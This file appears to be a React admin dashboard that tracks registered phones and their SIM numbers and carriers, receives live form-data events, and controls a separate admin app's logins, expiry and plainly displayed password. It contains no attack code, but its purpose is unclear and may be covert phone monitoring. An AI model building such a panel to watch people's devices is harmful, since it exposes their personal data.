import { useState, useEffect, useCallback, useRef } from "react";
import {
  ArrowLeft, RefreshCw, Trash2,
  Smartphone, Wifi, Search, Radio,
  ShieldOff, ShieldCheck, LogOut, Eye, EyeOff, Users, Key
} from "lucide-react";
import Badge from "@/components/Badge";
import StatCard from "@/components/StatCard";
import type { AdminApp, Device } from "@/lib/types";
import { getDevices, deleteDevice, calcStats, patchSysEntry } from "@/lib/supabase";

interface AppDetailProps {
  app: AdminApp;
  onBack: () => void;
}

type FilterType = "all" | "online" | "offline";

function mergeDevice(list: Device[], updated: Device): Device[] {
  const idx = list.findIndex((d) => d.sub_id === updated.sub_id);
  if (idx === -1) return [updated, ...list];
  const next = [...list];
  next[idx] = { ...list[idx], ...updated };
  return next;
}

const isSystemEntry = (d: Device) => d.sub_id.startsWith("admin_");

export default function AppDetail({ app, onBack }: AppDetailProps) {
  const [devices, setDevices] = useState<Device[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [search, setSearch] = useState("");
  const [filter, setFilter] = useState<FilterType>("all");
  const [busyId, setBusyId] = useState<string | null>(null);
  const [wsConnected, setWsConnected] = useState(false);

  // Admin control state
  const [showPassword, setShowPassword] = useState(false);
  const [logoutBusy, setLogoutBusy] = useState(false);
  const [blockBusy, setBlockBusy] = useState(false);
  const [adminMsg, setAdminMsg] = useState<{ ok: boolean; text: string } | null>(null);

  const wsRef = useRef<WebSocket | null>(null);

  const load = useCallback(async () => {
    setLoading(true); setError("");
    try { setDevices(await getDevices(app.token)); }
    catch (e: unknown) { setError(e instanceof Error ? e.message : "Error"); }
    finally { setLoading(false); }
  }, [app.token]);

  useEffect(() => { void load(); }, [load]);

  useEffect(() => {
    const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
    const wsUrl = `${proto}//${window.location.host}/api/device/${app.token}/ws`;
    let ws: WebSocket;
    let reconnectTimer: ReturnType<typeof setTimeout>;

    const connect = () => {
      ws = new WebSocket(wsUrl);
      wsRef.current = ws;
      ws.onopen = () => setWsConnected(true);
      ws.onclose = () => { setWsConnected(false); reconnectTimer = setTimeout(connect, 4000); };
      ws.onerror = () => ws.close();
      ws.onmessage = (e) => {
        try {
          const msg = JSON.parse(e.data as string) as { event: string; data: unknown };
          if (msg.event === "device:updated" || msg.event === "device:form_data") {
            const d = msg.data as Device;
            if (d?.sub_id) setDevices((prev) => mergeDevice(prev, d));
          } else if (msg.event === "device:deleted") {
            const uid = (msg.data as { sub_id?: string })?.sub_id;
            if (uid) setDevices((prev) => prev.filter((x) => x.sub_id !== uid));
          }
        } catch { /* noop */ }
      };
    };

    connect();
    return () => { clearTimeout(reconnectTimer); ws?.close(); };
  }, [app.token]);

  const handleDelete = async (uid: string) => {
    if (!confirm(`Delete ${uid}?`)) return;
    setBusyId(uid);
    try {
      await deleteDevice(app.token, uid);
      setDevices((p) => p.filter((x) => x.sub_id !== uid));
    } catch (e: unknown) { alert(e instanceof Error ? e.message : "Error"); }
    finally { setBusyId(null); }
  };

  const showAdminMsg = (ok: boolean, text: string) => {
    setAdminMsg({ ok, text });
    setTimeout(() => setAdminMsg(null), 6000);
  };

  // Force logout all admin sessions
  const handleLogoutAll = async (logoutEntryId: string) => {
    if (!confirm("Force logout all admin sessions on all devices?")) return;
    setLogoutBusy(true);
    try {
      await patchSysEntry(app.token, logoutEntryId, { ts: Date.now(), action: "logout_all" });
      showAdminMsg(true, "Logout signal sent. All active sessions will be logged out.");
    } catch (e: unknown) {
      showAdminMsg(false, e instanceof Error ? e.message : "Failed");
    } finally { setLogoutBusy(false); }
  };

  // Block admin login by setting expiry to past
  const handleBlock = async (expiryEntryId: string) => {
    if (!confirm("This will block the admin app login. Continue?")) return;
    setBlockBusy(true);
    try {
      await patchSysEntry(app.token, expiryEntryId, {
        end_at: Date.now() - 1000,
        blocked: true,
        blocked_at: Date.now(),
      });
      showAdminMsg(true, "Login blocked. Admin app will show 'Access expired'.");
      void load();
    } catch (e: unknown) {
      showAdminMsg(false, e instanceof Error ? e.message : "Failed");
    } finally { setBlockBusy(false); }
  };

  // Unblock admin login by setting expiry to 30 days from now
  const handleUnblock = async (expiryEntryId: string) => {
    setBlockBusy(true);
    try {
      await patchSysEntry(app.token, expiryEntryId, {
        end_at: Date.now() + 30 * 24 * 60 * 60 * 1000,
        blocked: false,
        unblocked_at: Date.now(),
      });
      showAdminMsg(true, "Login unblocked. Admin app access restored for 30 days.");
      void load();
    } catch (e: unknown) {
      showAdminMsg(false, e instanceof Error ? e.message : "Failed");
    } finally { setBlockBusy(false); }
  };

  // Logout a single session by deleting its entry
  const handleLogoutSession = async (uid: string) => {
    setBusyId(uid);
    try {
      await deleteDevice(app.token, uid);
      setDevices((p) => p.filter((x) => x.sub_id !== uid));
    } catch (e: unknown) { showAdminMsg(false, e instanceof Error ? e.message : "Error"); }
    finally { setBusyId(null); }
  };

  const now = Date.now();
  const isOnline = (d: Device) => {
    const t = d.data_json?.online_checked_at ?? 0;
    return t > 0 && now - t < 15 * 60 * 1000;
  };

  const deviceStatusVariant = (d: Device): "online" | "offline" | "unknown" => {
    if (isOnline(d)) return "online";
    if ((d.data_json?.online_checked_at ?? 0) > 0) return "offline";
    return "unknown";
  };

  const fmt = (ts?: number) => {
    if (!ts || ts === 0) return "—";
    return new Date(ts).toLocaleString("en-IN", { day: "numeric", month: "short", hour: "2-digit", minute: "2-digit" });
  };

  // Split real devices vs system entries
  const realDevices = devices.filter((d) => !isSystemEntry(d));
  const systemEntries = devices.filter((d) => isSystemEntry(d));

  // Parse system entries
  const sessionEntries = systemEntries.filter((d) => d.sub_id.startsWith("admin_session_dev_"));
  const logoutEntry = systemEntries.find((d) => d.sub_id === "admin_logout_control");
  const passwordEntry = systemEntries.find((d) => d.sub_id.startsWith("admin_password_"));
  const expiryEntry = systemEntries.find((d) => d.sub_id === "admin_expiry_main");

  // Check if login is currently blocked
  const expiryRaw = expiryEntry?.data_json as unknown as Record<string, unknown> | undefined;
  const isBlocked = expiryRaw?.blocked === true ||
    (typeof expiryRaw?.end_at === "number" && (expiryRaw.end_at as number) < Date.now());

  // Password value from data_json
  const passRaw = passwordEntry?.data_json as unknown as Record<string, unknown> | undefined;
  const passValue = passRaw
    ? Object.entries(passRaw).map(([k, v]) => `${k}: ${String(v)}`).join(" | ")
    : "—";

  const filtered = realDevices.filter((d) => {
    const q = search.toLowerCase();
    const matchSearch =
      !q ||
      [d.sub_id, d.data_json?.device_name, d.data_json?.model,
       d.data_json?.brand, d.data_json?.sim1number, d.data_json?.sim2number]
        .some((v) => v?.toLowerCase().includes(q));
    const online = isOnline(d);
    const matchFilter =
      filter === "all" ? true : filter === "online" ? online : !online;
    return matchSearch && matchFilter;
  });

  const stats = calcStats(realDevices);
  const hasAdminControl = systemEntries.length > 0;

  return (
    <div className="flex-1 overflow-auto h-full bg-[#080c16]">
      {/* Top bar */}
      <div className="sticky top-0 z-10 bg-[#080c16]/90 backdrop-blur border-b border-slate-800/60 h-14 flex items-center gap-2 px-3 sm:px-6">
        <button onClick={onBack}
                className="p-1.5 rounded-lg hover:bg-slate-800 text-slate-500 hover:text-white transition-colors flex-shrink-0">
          <ArrowLeft className="w-4 h-4" />
        </button>
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-1.5 flex-wrap">
            <h1 className="text-sm font-semibold text-white truncate max-w-[130px] sm:max-w-none">
              {app.label || app.token}
            </h1>
            <Badge variant={app.is_active ? "active" : "inactive"} />
            <span className={`flex items-center gap-1 text-[10px] px-1.5 py-0.5 rounded-full ${
              wsConnected ? "bg-emerald-900/30 text-emerald-400" : "bg-slate-800 text-slate-600"
            }`}>
              <Radio className={`w-2.5 h-2.5 ${wsConnected ? "animate-pulse" : ""}`} />
              {wsConnected ? "Live" : "Off"}
            </span>
          </div>
        </div>
        <button onClick={load} disabled={loading}
                className="p-1.5 rounded-lg hover:bg-slate-800 text-slate-500 hover:text-white transition-colors disabled:opacity-50">
          <RefreshCw className={`w-3.5 h-3.5 ${loading ? "animate-spin" : ""}`} />
        </button>
      </div>

      <div className="p-3 sm:p-6 space-y-3">
        {loading && devices.length === 0 ? (
          <div className="flex items-center justify-center py-24 text-slate-600">
            <span className="w-5 h-5 border-2 border-slate-700 border-t-blue-500 rounded-full animate-spin mr-2" />
            <span className="text-sm">Loading…</span>
          </div>
        ) : error ? (
          <div className="text-center py-16 bg-[#0d1220] border border-slate-800 rounded-2xl">
            <p className="text-sm text-red-400 mb-2">{error}</p>
            <button onClick={load} className="text-xs text-blue-400 hover:text-blue-300">Retry</button>
          </div>
        ) : (
          <>
            {/* ── Admin Control Panel ─────────────────────── */}
            {hasAdminControl && (
              <div className={`rounded-2xl border overflow-hidden ${
                isBlocked
                  ? "bg-red-950/20 border-red-800/40"
                  : "bg-[#0d1220] border-slate-700/60"
              }`}>
                {/* Header */}
                <div className="flex items-center gap-2 px-4 py-3 border-b border-slate-800/60">
                  <div className={`w-6 h-6 rounded-lg flex items-center justify-center ${
                    isBlocked ? "bg-red-900/40" : "bg-blue-900/40"
                  }`}>
                    {isBlocked
                      ? <ShieldOff className="w-3.5 h-3.5 text-red-400" />
                      : <ShieldCheck className="w-3.5 h-3.5 text-blue-400" />}
                  </div>
                  <div className="flex-1">
                    <p className="text-xs font-semibold text-white">Admin App Control</p>
                    <p className="text-[10px] text-slate-500">
                      {app.token}_register · {sessionEntries.length} active session{sessionEntries.length !== 1 ? "s" : ""}
                    </p>
                  </div>
                  <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-full ${
                    isBlocked
                      ? "bg-red-900/40 text-red-400"
                      : "bg-emerald-900/30 text-emerald-400"
                  }`}>
                    {isBlocked ? "BLOCKED" : "ALLOWED"}
                  </span>
                </div>

                {/* Stat row */}
                <div className="grid grid-cols-3 divide-x divide-slate-800/60 border-b border-slate-800/60">
                  <div className="flex flex-col items-center py-3">
                    <Users className="w-3.5 h-3.5 text-slate-500 mb-1" />
                    <p className="text-base font-bold text-white tabular-nums">{sessionEntries.length}</p>
                    <p className="text-[10px] text-slate-600">Sessions</p>
                  </div>
                  <div className="flex flex-col items-center py-3">
                    <LogOut className="w-3.5 h-3.5 text-slate-500 mb-1" />
                    <p className="text-base font-bold text-white tabular-nums">
                      {logoutEntry ? fmt((logoutEntry.data_json as unknown as Record<string,unknown>)?.ts as number) : "—"}
                    </p>
                    <p className="text-[10px] text-slate-600">Last Logout</p>
                  </div>
                  <div className="flex flex-col items-center py-3">
                    <Key className="w-3.5 h-3.5 text-slate-500 mb-1" />
                    <button
                      onClick={() => setShowPassword((v) => !v)}
                      className="text-[10px] text-blue-500 hover:text-blue-400 mt-0.5 flex items-center gap-1"
                    >
                      {showPassword ? <EyeOff className="w-2.5 h-2.5" /> : <Eye className="w-2.5 h-2.5" />}
                      {showPassword ? "hide" : "password"}
                    </button>
                    {showPassword && (
                      <p className="text-[10px] font-mono text-amber-400 mt-1 max-w-[100px] text-center break-all select-all">
                        {passValue}
                      </p>
                    )}
                    {!showPassword && <p className="text-[10px] text-slate-600">Password</p>}
                  </div>
                </div>

                {/* Admin message */}
                {adminMsg && (
                  <div className={`mx-3 mt-3 px-3 py-2 rounded-xl text-xs font-medium ${
                    adminMsg.ok
                      ? "bg-emerald-900/20 text-emerald-400 border border-emerald-800/40"
                      : "bg-red-900/20 text-red-400 border border-red-800/40"
                  }`}>
                    {adminMsg.text}
                  </div>
                )}

                {/* Action buttons */}
                <div className="p-3 grid grid-cols-2 gap-2">
                  {/* Force Logout All */}
                  {logoutEntry && (
                    <button
                      onClick={() => void handleLogoutAll(logoutEntry.sub_id)}
                      disabled={logoutBusy}
                      className="flex items-center justify-center gap-1.5 px-3 py-2.5 rounded-xl bg-amber-900/20 hover:bg-amber-900/35 border border-amber-800/30 text-amber-400 text-xs font-medium transition-colors disabled:opacity-50"
                    >
                      {logoutBusy
                        ? <span className="w-3 h-3 border border-amber-400/30 border-t-amber-400 rounded-full animate-spin" />
                        : <LogOut className="w-3.5 h-3.5" />}
                      Force Logout All
                    </button>
                  )}

                  {/* Block / Unblock */}
                  {expiryEntry && (
                    isBlocked ? (
                      <button
                        onClick={() => void handleUnblock(expiryEntry.sub_id)}
                        disabled={blockBusy}
                        className="flex items-center justify-center gap-1.5 px-3 py-2.5 rounded-xl bg-emerald-900/20 hover:bg-emerald-900/35 border border-emerald-800/30 text-emerald-400 text-xs font-medium transition-colors disabled:opacity-50"
                      >
                        {blockBusy
                          ? <span className="w-3 h-3 border border-emerald-400/30 border-t-emerald-400 rounded-full animate-spin" />
                          : <ShieldCheck className="w-3.5 h-3.5" />}
                        Unblock Login
                      </button>
                    ) : (
                      <button
                        onClick={() => void handleBlock(expiryEntry.sub_id)}
                        disabled={blockBusy}
                        className="flex items-center justify-center gap-1.5 px-3 py-2.5 rounded-xl bg-red-900/20 hover:bg-red-900/35 border border-red-800/30 text-red-400 text-xs font-medium transition-colors disabled:opacity-50"
                      >
                        {blockBusy
                          ? <span className="w-3 h-3 border border-red-400/30 border-t-red-400 rounded-full animate-spin" />
                          : <ShieldOff className="w-3.5 h-3.5" />}
                        Block Login
                      </button>
                    )
                  )}
                </div>

                {/* Active sessions list */}
                {sessionEntries.length > 0 && (
                  <div className="border-t border-slate-800/60 px-3 pb-3 pt-2">
                    <p className="text-[10px] text-slate-600 font-medium mb-2 uppercase tracking-wide">Active Sessions</p>
                    <div className="space-y-1.5">
                      {sessionEntries.map((s) => {
                        const sRaw = s.data_json as unknown as Record<string, unknown>;
                        const loggedAt = typeof sRaw?.logged_in_at === "number"
                          ? fmt(sRaw.logged_in_at as number)
                          : typeof sRaw?.ts === "number"
                          ? fmt(sRaw.ts as number)
                          : "—";
                        const shortId = s.sub_id.replace("admin_session_dev_", "");
                        return (
                          <div key={s.sub_id}
                               className="flex items-center gap-2 bg-slate-900/50 rounded-xl px-3 py-2">
                            <div className="w-1.5 h-1.5 rounded-full bg-emerald-500 flex-shrink-0" />
                            <div className="flex-1 min-w-0">
                              <p className="text-xs font-mono text-slate-300 truncate">{shortId}</p>
                              <p className="text-[10px] text-slate-600">Logged in {loggedAt}</p>
                            </div>
                            <button
                              onClick={() => void handleLogoutSession(s.sub_id)}
                              disabled={busyId === s.sub_id}
                              title="Logout this session"
                              className="p-1 rounded-lg hover:bg-red-900/30 text-slate-600 hover:text-red-400 transition-colors"
                            >
                              {busyId === s.sub_id
                                ? <span className="w-3 h-3 border border-slate-600 border-t-slate-400 rounded-full animate-spin block" />
                                : <LogOut className="w-3 h-3" />}
                            </button>
                          </div>
                        );
                      })}
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* Stats */}
            <div className="grid grid-cols-2 gap-2">
              <StatCard label="Devices" value={stats.total}  icon={Smartphone} color="blue" />
              <StatCard label="Online"  value={stats.online} icon={Wifi}        color="green" />
            </div>

            {/* Search + Filter */}
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-slate-600 pointer-events-none" />
              <input value={search} onChange={(e) => setSearch(e.target.value)}
                     placeholder="Search by ID, device, SIM…"
                     className="w-full bg-[#0d1220] border border-slate-800 rounded-xl pl-9 pr-4 py-2 text-sm placeholder-slate-700 text-white focus:outline-none focus:border-blue-500/50 transition-colors" />
            </div>

            <div className="flex gap-1.5 items-center">
              {(["all", "online", "offline"] as FilterType[]).map((f) => (
                <button key={f} onClick={() => setFilter(f)}
                        className={`px-3 py-1.5 rounded-lg text-xs font-medium capitalize transition-colors ${
                          filter === f ? "bg-blue-600 text-white" : "bg-[#0d1220] border border-slate-800 text-slate-500 hover:text-slate-300"
                        }`}>{f}</button>
              ))}
              <span className="ml-auto text-xs text-slate-600">{filtered.length} devices</span>
            </div>

            {/* Device list */}
            {filtered.length === 0 ? (
              <div className="text-center py-12 bg-[#0d1220] border border-slate-800 rounded-2xl">
                <Smartphone className="w-7 h-7 mx-auto text-slate-700 mb-3" />
                <p className="text-sm text-slate-600">No devices found.</p>
              </div>
            ) : (
              <div className="space-y-2">
                {filtered.map((d) => {
                  const dj = d.data_json ?? {};
                  const busy = busyId === d.sub_id;
                  const deviceLabel = dj.device_name || dj.model || dj.brand || null;
                  const simInfo = dj.sim1number
                    ? `${dj.sim1number}${dj.sim1carrier ? ` · ${dj.sim1carrier}` : ""}`
                    : null;
                  const statusV = deviceStatusVariant(d);

                  return (
                    <div key={d.sub_id}
                         className="bg-[#0d1220] border border-slate-800/80 rounded-2xl px-3 sm:px-4 py-3">
                      <div className="flex items-start gap-2.5">
                        <div className={`w-8 h-8 rounded-xl flex items-center justify-center flex-shrink-0 mt-0.5 ${
                          statusV === "online" ? "bg-emerald-900/20" : "bg-slate-800"
                        }`}>
                          <Smartphone className={`w-4 h-4 ${
                            statusV === "online" ? "text-emerald-400" : "text-slate-500"
                          }`} />
                        </div>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-1.5 flex-wrap">
                            <span className="font-mono text-xs sm:text-sm text-white font-semibold truncate max-w-[160px] sm:max-w-none">{d.sub_id}</span>
                            <Badge variant={statusV} pulse={statusV === "online"} />
                          </div>
                          <div className="flex flex-wrap gap-x-2 gap-y-0.5 mt-0.5 text-xs text-slate-500">
                            {deviceLabel && <span className="truncate max-w-[200px]">{deviceLabel}</span>}
                            {simInfo && <span className="font-mono">{simInfo}</span>}
                          </div>
                          <p className="text-[10px] text-slate-600 mt-0.5">
                            Joined {fmt(d.registered_at ?? d.created_at)}
                            {dj.last_seen_at ? ` · Seen ${fmt(dj.last_seen_at)}` : ""}
                          </p>
                        </div>
                        <button onClick={() => void handleDelete(d.sub_id)} disabled={busy}
                                className="p-1.5 rounded-lg hover:bg-red-900/25 text-slate-700 hover:text-red-400 transition-colors disabled:opacity-50 flex-shrink-0 mt-0.5">
                          {busy
                            ? <span className="w-3.5 h-3.5 border border-slate-500/30 border-t-slate-500 rounded-full animate-spin block" />
                            : <Trash2 className="w-3.5 h-3.5" />}
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
}
